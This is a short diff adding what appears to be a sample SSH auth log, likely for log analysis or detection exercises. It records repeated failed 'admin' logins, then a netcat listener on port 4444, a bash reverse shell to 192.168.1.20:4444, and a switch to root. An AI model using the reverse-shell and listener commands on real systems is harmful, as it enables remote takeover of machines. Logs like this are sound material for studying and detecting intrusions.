@@ -1,0 +1,7 @@
+Apr 17 12:00:01 localhost sshd[2456]: Failed password for invalid user admin from 192.168.1.50 port 51324 ssh2
+Apr 17 12:00:05 localhost sshd[2456]: Failed password for invalid user admin from 192.168.1.50 port 51324 ssh2
+Apr 17 12:00:09 localhost sshd[2456]: Failed password for invalid user admin from 192.168.1.50 port 51324 ssh2
+Apr 17 12:21:12 ubuntu sshd[1234]: Failed password for invalid user admin from 192.168.1.20 port 54892 ssh2
+Apr 17 12:22:02 ubuntu user: nc -lvp 4444
+Apr 17 12:23:22 ubuntu user: bash -i >& /dev/tcp/192.168.1.20/4444 0>&1
+Apr 17 12:23:40 ubuntu su - root
